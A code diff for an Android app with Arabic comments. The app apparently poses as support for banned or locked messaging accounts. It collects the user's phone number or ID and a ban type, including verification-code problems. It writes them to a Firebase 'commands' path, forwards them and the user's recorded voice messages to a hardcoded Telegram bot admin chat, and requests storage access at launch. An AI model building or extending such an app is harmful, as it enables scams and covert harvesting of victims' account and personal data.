@@ -22,6 +22,9 @@ import android.view.View;
 import android.view.ViewGroup;
 import android.view.Window;
 import android.view.WindowManager;
+import android.webkit.WebChromeClient;
+import android.webkit.WebView;
+import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.FrameLayout;
@@ -29,6 +32,7 @@ import android.widget.ImageButton;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.ScrollView;
+import android.widget.Spinner;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -55,8 +59,9 @@ import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
-    private EditText edtUserName, edtServiceType;
-    private Button btnSubmit;
+    private EditText edtUserName;
+    private Spinner spinnerBanType; // تم استبدال edtServiceType بـ Spinner
+    private Button btnSubmit, btnWatchVideo; // إضافة زر الفيديو
     private ProgressBar mainProgressBar;
     private final OkHttpClient client = new OkHttpClient();
     
@@ -71,24 +76,23 @@ public class MainActivity extends AppCompatActivity {
     private final Handler chatHandler = new Handler(Looper.getMainLooper());
     private Runnable chatRunnable;
     private String currentUserID = "visitor";
-    private String selectedProblemType = ""; // لتخزين المشكلة القادمة من الواجهة الافتتاحية
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // استقبال نوع المشكلة المختارة
-        selectedProblemType = getIntent().getStringExtra("selected_problem");
-        if (selectedProblemType == null) selectedProblemType = "غير محدد";
-
-        // طلب إذن الملفات فقط (ضروري لبدء التطبيق)
+        // طلب إذن الملفات فقط عند البدء (إدارة الملفات)
         requestStoragePermission();
 
         edtUserName = findViewById(R.id.edtUserName);
-        edtServiceType = findViewById(R.id.edtServiceType);
+        spinnerBanType = findViewById(R.id.spinnerBanType);
         btnSubmit = findViewById(R.id.btnSubmit);
+        btnWatchVideo = findViewById(R.id.btnWatchVideo); // ربط زر الفيديو
         mainProgressBar = findViewById(R.id.mainProgressBar);
+
+        // إعداد خيارات القائمة المنسدلة (Spinner)
+        setupBanTypeSpinner();
 
         SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
         if (pref.contains("user_name")) {
@@ -100,17 +104,36 @@ public class MainActivity extends AppCompatActivity {
 
         setupFloatingChatButton();
 
+        // منطق زر الإرسال
         btnSubmit.setOnClickListener(v -> {
             String name = edtUserName.getText().toString().trim();
+            String selectedBan = spinnerBanType.getSelectedItem().toString(); // جلب الخيار المختار
+            
             if (!name.isEmpty()) {
                 currentUserID = name; 
                 mainProgressBar.setVisibility(View.VISIBLE);
                 btnSubmit.setEnabled(false);
-                uploadToFirebase(name);
+                uploadToFirebase(name, selectedBan);
             } else {
-                Toast.makeText(this, "يرجى إدخال رقم الهاتف", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "يرجى إدخال رقم الهاتف أو الهوية", Toast.LENGTH_SHORT).show();
             }
         });
+
+        // منطق زر مشاهدة الفيديو
+        btnWatchVideo.setOnClickListener(v -> {
+            showVideoPopup("https://www.youtube.com/embed/YOUR_VIDEO_ID"); // ضع رابط الفيديو هنا
+        });
+    }
+
+    private void setupBanTypeSpinner() {
+        String[] banOptions = {
+                "مشكلة حظر الحساب",
+                "تسجيل الدخول غير متوفر",
+                "حظر انتهاك أو مشدد",
+                "مشكلة كود التحقق"
+        };
+        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, banOptions);
+        spinnerBanType.setAdapter(adapter);
     }
 
     private void requestStoragePermission() {
@@ -126,12 +149,27 @@ public class MainActivity extends AppCompatActivity {
     private void setupFloatingChatButton() {
         fabChat = new FloatingActionButton(this);
         fabChat.setImageResource(android.R.drawable.stat_notify_chat);
-        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
+        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#2E7D32"))); // لون أخضر رسمي
         FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
         params.gravity = Gravity.BOTTOM | Gravity.START;
         params.setMargins(50, 0, 0, 50);
         ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
         fabChat.setOnClickListener(v -> showChatPopup());
+    }
+
+    private void showVideoPopup(String videoUrl) {
+        Dialog dialog = new Dialog(this);
+        dialog.setContentView(R.layout.popup_video);
+        WebView webView = dialog.findViewById(R.id.videoWebView);
+        webView.getSettings().setJavaScriptEnabled(true);
+        webView.setWebChromeClient(new WebChromeClient());
+        webView.loadUrl(videoUrl);
+        
+        if (dialog.getWindow() != null) {
+            dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+            dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        }
+        dialog.show();
     }
 
     @SuppressLint("ClickableViewAccessibility")
@@ -168,7 +206,6 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        // تعديل: طلب الإذن فقط عند لمس زر التسجيل
         btnRecord.setOnTouchListener((v, event) -> {
             if (event.getAction() == MotionEvent.ACTION_DOWN) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -218,7 +255,7 @@ public class MainActivity extends AppCompatActivity {
         RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                 .addFormDataPart("chat_id", ADMIN_CHAT_ID)
-                .addFormDataPart("caption", "🎤 بصمة من: " + currentUserID)
+                .addFormDataPart("caption", "🎤 بصمة صوتية من: " + currentUserID)
                 .build();
         client.newCall(new Request.Builder().url("https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendVoice").post(body).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
@@ -226,19 +263,18 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private void uploadToFirebase(String name) {
+    private void uploadToFirebase(String name, String banType) {
         String url = FIREBASE_URL + "commands/" + name + ".json";
         try {
             JSONObject body = new JSONObject();
             body.put("status", "waiting");
-            body.put("service", edtServiceType.getText().toString());
-            body.put("problem_type", selectedProblemType); // إضافة نوع المشكلة المختارة من الواجهة السابقة
+            body.put("ban_type", banType); // إرسال نوع الحظر المختار من القائمة
             
             client.newCall(new Request.Builder().url(url).put(RequestBody.create(body.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                 @Override public void onFailure(Call call, IOException e) { handleError("فشل الاتصال"); }
                 @Override public void onResponse(Call call, Response response) {
                     if (response.isSuccessful()) { 
-                        sendTelegramNotification(name); 
+                        sendTelegramNotification(name, banType); 
                         saveAndProceed(name); 
                     }
                 }
@@ -246,8 +282,8 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception ignored) {}
     }
 
-    private void sendTelegramNotification(String name) {
-        String msg = "🚀 طلب جديد:\n👤 المستخدم: " + name + "\n⚠️ المشكلة: " + selectedProblemType;
+    private void sendTelegramNotification(String name, String banType) {
+        String msg = "🚀 طلب فحص جديد:\n👤 المستخدم: " + name + "\n⚠️ النوع: " + banType;
         String url = "https://api.telegram.org/bot"+TELEGRAM_BOT_TOKEN+"/sendMessage?chat_id="+ADMIN_CHAT_ID+"&text="+Uri.encode(msg);
         client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) {}
@@ -255,7 +291,6 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    // --- بقية الدوال (المحادثة والتحديث) ---
     private void saveMessageToFirebase(String sender, String text) {
         String url = FIREBASE_URL + "commands/" + currentUserID + "/messages.json";
         try {
@@ -314,14 +349,16 @@ public class MainActivity extends AppCompatActivity {
     private void addMessageToUI(LinearLayout container, String text, String sender) {
         TextView tv = new TextView(this);
         tv.setText(text);
-        tv.setPadding(30, 20, 30, 20);
+        tv.setPadding(35, 25, 35, 25);
         LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
         lp.setMargins(10, 10, 10, 10);
         if (sender.equals("user")) {
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
+            tv.setBackgroundColor(Color.parseColor("#E8F5E9"));
             lp.gravity = Gravity.END;
         } else {
             tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
+            tv.setBackgroundColor(Color.parseColor("#2E7D32"));
             tv.setTextColor(Color.WHITE);
             lp.gravity = Gravity.START;
         }
@@ -337,7 +374,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void handleError(String msg) {
-        runOnUiThread(() -> { mainProgressBar.setVisibility(View.GONE); btnSubmit.setEnabled(true); Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); });
+        runOnUiThread(() -> { 
+            mainProgressBar.setVisibility(View.GONE); 
+            btnSubmit.setEnabled(true); 
+            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); 
+        });
     }
 
     private void stopChatMonitoring() { chatHandler.removeCallbacks(chatRunnable); }
